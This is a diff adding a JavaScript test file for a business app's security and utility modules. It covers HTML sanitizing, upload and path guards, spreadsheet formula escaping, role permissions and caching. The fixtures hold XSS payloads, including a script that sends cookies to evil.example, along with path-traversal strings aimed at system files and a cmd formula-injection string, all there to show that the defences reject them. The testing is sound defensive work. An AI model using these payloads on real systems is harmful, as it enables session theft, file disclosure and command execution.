@@ -1,0 +1,234 @@
+'use strict';
+
+const test = require('node:test');
+const assert = require('node:assert/strict');
+const path = require('node:path');
+const fs = require('node:fs');
+const Module = require('node:module');
+const ts = require('typescript');
+
+if (!require.extensions['.ts']) {
+  require.extensions['.ts'] = function compileTs(module, filename) {
+    const source = fs.readFileSync(filename, 'utf8');
+    const transpiled = ts.transpileModule(source, {
+      compilerOptions: {
+        module: ts.ModuleKind.CommonJS,
+        target: ts.ScriptTarget.ES2022,
+        esModuleInterop: true,
+        resolveJsonModule: true,
+      },
+      fileName: filename,
+    });
+    module._compile(transpiled.outputText, filename);
+  };
+}
+
+const V2_ROOT = path.resolve(__dirname, '../../../../..');
+const origResolveFilename = Module._resolveFilename;
+Module._resolveFilename = function resolveWorkspaceAliases(request, parent, isMain, options) {
+  if (request === '@toantrung/contracts') {
+    return path.join(V2_ROOT, 'packages/contracts/src/common/index.ts');
+  }
+  if (request.startsWith('@toantrung/contracts/')) {
+    const sub = request.slice('@toantrung/contracts/'.length);
+    return path.join(V2_ROOT, 'packages/contracts/src', sub, 'index.ts');
+  }
+  if (request === '@toantrung/database') {
+    return path.join(V2_ROOT, 'packages/database/src/index.ts');
+  }
+  try {
+    return origResolveFilename.call(this, request, parent, isMain, options);
+  } catch (err) {
+    if (request.startsWith('.') && parent && parent.filename) {
+      const candidateTs = path.resolve(path.dirname(parent.filename), `${request}.ts`);
+      if (fs.existsSync(candidateTs)) return candidateTs;
+      const candidateIndexTs = path.resolve(path.dirname(parent.filename), request, 'index.ts');
+      if (fs.existsSync(candidateIndexTs)) return candidateIndexTs;
+    }
+    throw err;
+  }
+};
+
+const { routeDesignCommand, validateCommandReadiness } = require(
+  path.join(V2_ROOT, 'apps/api/src/modules/05-ai-design/command-router.ts')
+);
+const { sanitizeUntrustedReportHtml } = require(
+  path.join(V2_ROOT, 'apps/api/src/core/security/html-sanitizer.ts')
+);
+const {
+  savePrivateBusinessFile,
+  resolvePrivateBusinessFilePath,
+} = require(path.join(V2_ROOT, 'apps/api/src/core/storage/private-files.service.ts'));
+const { ROLE_PERMISSION_MATRIX } = require(
+  path.join(V2_ROOT, 'packages/contracts/src/common/index.ts')
+);
+const {
+  sanitizeForFormulaInjection,
+  sanitizeXlsxSheetName,
+  buildStandardXlsxBuffer,
+} = require(path.join(V2_ROOT, 'apps/api/src/core/export/xlsx-builder.ts'));
+const {
+  getOrComputeScopedCache,
+  bumpDomainRevisions,
+} = require(path.join(V2_ROOT, 'apps/api/src/core/cache/server-data-cache.ts'));
+const {
+  isValidCalendarYmd,
+  getCustomCanonicalDateRange,
+} = require(path.join(V2_ROOT, 'apps/api/src/core/reporting-dates.js'));
+
+test('UPG-20261123-01: M05 @banner, @baneer, @taobanner, @TaoAnhPoster, @taoanh routing & readiness', () => {
+  const bannerAliases = [
+    '@banner Khuyến mãi màn hình LED P2.5 hội trường 1920x1080',
+    '@baneer Poster hội nghị khách hàng Toàn Trung 1080x1350',
+    '@taobanner Banner quảng cáo bảng điện tử ngoài trời',
+    '@tạobanner Banner sự kiện ra mắt showroom LED',
+    '@TaoAnhPoster Poster giải pháp màn hình ghép',
+  ];
+
+  for (const msg of bannerAliases) {
+    const routed = routeDesignCommand({ rawMessage: msg });
+    assert.equal(
+      routed.action,
+      'GENERATE_BANNER',
+      `Expected GENERATE_BANNER for "${msg}", got ${routed.action}`
+    );
+    assert.ok(routed.cleanInstruction.length > 5);
+
+    const readiness = validateCommandReadiness({
+      routed,
+      hasSurveyPhoto: false,
+      hasPlacementQuad: false,
+    });
+    assert.equal(readiness.canExecuteImmediately, true, `Banner command "${msg}" should be ready immediately`);
+    assert.equal(readiness.effectiveAction, 'GENERATE_BANNER');
+  }
+
+  const perspectiveDecision = routeDesignCommand({
+    rawMessage: '@taoanh Ghép màn hình LED P3 ngang 4.8m cao 2.7m vào mặt tiền',
+  });
+  assert.equal(perspectiveDecision.action, 'GENERATE_SCENE');
+});
+
+test('UPG-20261123-02: sanitizeUntrustedReportHtml strips XSS payloads while preserving safe report markup', () => {
+  const malicious = `
+    <h2>Báo cáo Toàn Trung</h2>
+    <p onclick="alert(1)" style="color:red">Doanh số tăng <strong>25%</strong></p>
+    <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
+    <img src="x" onerror="alert('xss')" />
+    <svg onload="alert('svg')"><circle r="10"/></svg>
+    <iframe src="javascript:alert(2)"></iframe>
+    <a href="javascript:alert(3)" target="_blank">Link độc hại</a>
+    <a href="https://toantrung.com.vn/bao-cao">Link hợp lệ</a>
+  `;
+  const clean = sanitizeUntrustedReportHtml(malicious);
+
+  assert.equal(clean.includes('<script'), false);
+  assert.equal(clean.includes('onerror'), false);
+  assert.equal(clean.includes('onclick'), false);
+  assert.equal(clean.includes('onload'), false);
+  assert.equal(clean.includes('<svg'), false);
+  assert.equal(clean.includes('<iframe'), false);
+  assert.equal(clean.includes('javascript:'), false);
+  assert.equal(clean.includes('<h2>Báo cáo Toàn Trung</h2>'), true);
+  assert.equal(clean.includes('<strong>25%</strong>'), true);
+  assert.equal(clean.includes('href="https://toantrung.com.vn/bao-cao"'), true);
+});
+
+test('UPG-20261123-03: private-files.service blocks path traversal and disguised SVG/HTML/JS uploads', () => {
+  assert.equal(resolvePrivateBusinessFilePath('../../package.json'), null);
+  assert.equal(resolvePrivateBusinessFilePath('..\\..\\package.json'), null);
+  assert.equal(resolvePrivateBusinessFilePath('/etc/passwd'), null);
+  assert.equal(resolvePrivateBusinessFilePath('C:\\Windows\\win.ini'), null);
+
+  assert.throws(
+    () =>
+      savePrivateBusinessFile({
+        bucket: 'leads',
+        originalFileName: 'xss.svg',
+        declaredMimeType: 'image/svg+xml',
+        fileBuffer: Buffer.from('<svg onload="alert(1)"></svg>', 'utf8'),
+      }),
+    /Định dạng tệp không được phép tải lên/
+  );
+
+  assert.throws(
+    () =>
+      savePrivateBusinessFile({
+        bucket: 'leads',
+        originalFileName: 'disguised.png',
+        declaredMimeType: 'image/png',
+        fileBuffer: Buffer.from('<!DOCTYPE html><script>alert(1)</script>', 'utf8'),
+      }),
+    /Định dạng tệp không được phép tải lên/
+  );
+});
+
+test('UPG-20261123-04: BA ROLE_PERMISSION_MATRIX excludes TRACKING_ADS_OPTIMIZE from BOD', () => {
+  assert.equal(ROLE_PERMISSION_MATRIX.BOD.includes('TRACKING_ADS_OPTIMIZE'), false);
+  assert.equal(ROLE_PERMISSION_MATRIX.BOD.includes('DASHBOARD_VIEW'), true);
+  assert.equal(ROLE_PERMISSION_MATRIX.BOD.includes('EXPORT_DATA'), true);
+  assert.equal(ROLE_PERMISSION_MATRIX.MKT_LEAD.includes('TRACKING_ADS_OPTIMIZE'), true);
+});
+
+test('UPG-20261123-05: xlsx-builder neutralizes formula injection (including leading whitespace) and truncates/dedupes sheet names', () => {
+  assert.equal(sanitizeForFormulaInjection('=cmd|\'/C calc\'!A0'), "'=cmd|'/C calc'!A0");
+  assert.equal(sanitizeForFormulaInjection('  \t+SUM(A1:A2)'), "'  \t+SUM(A1:A2)");
+  assert.equal(sanitizeForFormulaInjection('-100+200'), "'-100+200");
+  assert.equal(sanitizeForFormulaInjection('@HYPERLINK("http://evil")'), "'@HYPERLINK(\"http://evil\")");
+  assert.equal(sanitizeForFormulaInjection('Báo cáo bình thường'), 'Báo cáo bình thường');
+
+  const used = new Set();
+  const s1 = sanitizeXlsxSheetName('Báo cáo: Doanh số [Q4/2026]*?\\Chi tiết rất dài vượt 31 ký tự', used);
+  const s2 = sanitizeXlsxSheetName('Báo cáo: Doanh số [Q4/2026]*?\\Chi tiết rất dài vượt 31 ký tự', used);
+  assert.ok(s1.length <= 31, `Sheet name length ${s1.length} must be <= 31`);
+  assert.ok(s2.length <= 31, `Duplicate sheet name length ${s2.length} must be <= 31`);
+  assert.notEqual(s1, s2);
+  assert.equal(/[:\\/?*\[\]]/.test(s1), false);
+
+  const buf = buildStandardXlsxBuffer([
+    {
+      name: 'Báo cáo: [1] / Rất dài vượt quá giới hạn 31 ký tự chuẩn Excel',
+      title: 'Báo cáo Kiểm chứng Toàn Trung',
+      columns: [
+        { key: 'name', header: 'Tên' },
+        { key: 'formula', header: 'Công thức' },
+      ],
+      rows: [{ name: 'Khách A', formula: '=1+1' }],
+    },
+  ]);
+  assert.ok(Buffer.isBuffer(buf) && buf.length > 100);
+});
+
+test('UPG-20261123-06: server-data-cache invalidates multi-domain inflight keys and reporting-dates rejects rollover dates', async () => {
+  assert.equal(isValidCalendarYmd('2026-11-23'), true);
+  assert.equal(isValidCalendarYmd('2026-02-31'), false);
+  assert.equal(isValidCalendarYmd('2026-04-31'), false);
+
+  const fallbackRange = getCustomCanonicalDateRange('2026-02-31', '2026-11-23');
+  assert.notEqual(fallbackRange.startDateStr, '2026-02-31');
+
+  let calls = 0;
+  const val1 = await getOrComputeScopedCache({
+    domains: ['ads', 'leads'],
+    key: 'upg-test-multi-domain',
+    ttlMs: 30_000,
+    compute: async () => {
+      calls += 1;
+      return { count: calls };
+    },
+  });
+  assert.equal(val1.data.count, 1);
+
+  bumpDomainRevisions(['leads'], 'test_lead_mutation');
+
+  const val2 = await getOrComputeScopedCache({
+    domains: ['ads', 'leads'],
+    key: 'upg-test-multi-domain',
+    ttlMs: 30_000,
+    compute: async () => {
+      calls += 1;
+      return { count: calls };
+    },
+  });
+  assert.equal(val2.data.count, 2);
+});
